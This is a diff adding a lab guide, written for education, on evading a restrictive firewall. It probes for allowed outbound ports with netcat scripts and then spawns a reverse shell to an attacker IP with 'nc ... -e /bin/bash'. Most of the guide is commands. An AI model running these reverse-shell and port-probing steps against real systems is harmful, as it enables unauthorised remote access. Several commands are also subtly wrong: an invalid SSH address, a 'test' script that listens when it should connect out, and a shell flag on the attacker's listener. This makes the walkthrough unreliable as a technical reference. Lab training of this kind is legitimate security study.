@@ -1,0 +1,126 @@
+BYPASSING FIREWALL – SCENARIO 04 (REVERSE SHELL)
+
+This guide explains how to bypass a restrictive firewall (rules4) that blocks all incoming traffic but allows some outgoing connections. Direct bindshell or standard reverse shell attempts fail, so we need to identify allowed outgoing ports and then establish a reverse shell through them.
+
+⚠️ For educational purposes only • Developed by M!ss s3c
+
+Step 1: Access the server
+ssh root@1172.16.1.5
+
+
+Enter the password
+
+Navigate to the firewall rules directory:
+
+cd /home/msfadmin/firewall
+
+Step 2: Reset and apply restrictive rules
+./limpa_rules.sh    # clears existing firewall rules
+./rules4.sh         # applies restrictive firewall rules
+
+Step 3: Attempt standard reverse shell (will fail)
+
+On attacker machine:
+
+nc -vnlp 5050 -e /bin/bash
+
+
+On the target machine (via VPN or direct network):
+
+nc -vn 172.20.1.73 5050
+
+
+Expected: connection fails due to firewall restrictions.
+
+Step 4: Identify allowed outgoing ports
+
+We need to find which outgoing ports from the server are allowed to connect to the attacker machine.
+
+4.1 Create a testing script on the server
+nano test_fw.sh
+
+
+Add the following:
+
+#!/bin/bash
+echo "Opening ports..."
+nc -vnlp 172.20.1.73 80 &
+sleep 2
+nc -vnlp 172.20.1.73 443 &
+sleep 2
+nc -vnlp 172.20.1.73 53 &
+echo "Ports opened"
+netstat -nlpt
+
+
+This script attempts to open connections from the server to the attacker on multiple ports.
+
+netstat -nlpt shows which connections were successfully established.
+
+4.2 Create a corresponding script on the attacker machine
+nano open_fw.sh
+
+#!/bin/bash
+echo "Opening ports..."
+nc -vnlp 80 &
+sleep 2
+nc -vnlp 443 &
+sleep 2
+nc -vnlp 53 &
+echo "Ports opened"
+netstat -nlpt
+
+4.3 Run the scripts
+
+On the attacker machine:
+
+./open_fw.sh
+
+
+On the server:
+
+./test_fw.sh | grep "open"
+
+
+Check the output to see which ports successfully connected.
+
+In the example, ports 80, 443, and 53 are allowed outgoing.
+
+This process discovers which firewall rules allow outgoing connections. Both TCP and UDP can be tested.
+
+Step 5: Establish reverse shell
+
+On attacker machine, listen on an allowed port:
+
+nc -vnlp 53
+
+
+On the target server, connect back to attacker IP using the allowed port:
+
+nc -vn <attacker-IP> 53 -e /bin/bash
+
+
+Replace <attacker-IP> with the attacker machine’s IP.
+
+When the connection shows OPEN, the reverse shell is successfully established.
+
+Step 6: Verify connection
+
+On attacker machine:
+
+ifconfig eth0
+
+
+Confirms that you have shell access through the allowed outgoing port.
+
+👉 What you learned here
+
+Restrictive firewalls may block direct connections, but outgoing connections can often be used for reverse shells.
+
+Scripting port tests helps identify which ports are allowed through the firewall.
+
+Using reverse shells over allowed ports bypasses restrictive rules.
+
+Always validate allowed ports before attempting reverse shell.
+
+⚠️ Only use this method in authorized and controlled environments for learning or testing purposes. Unauthorized usage is illegal.
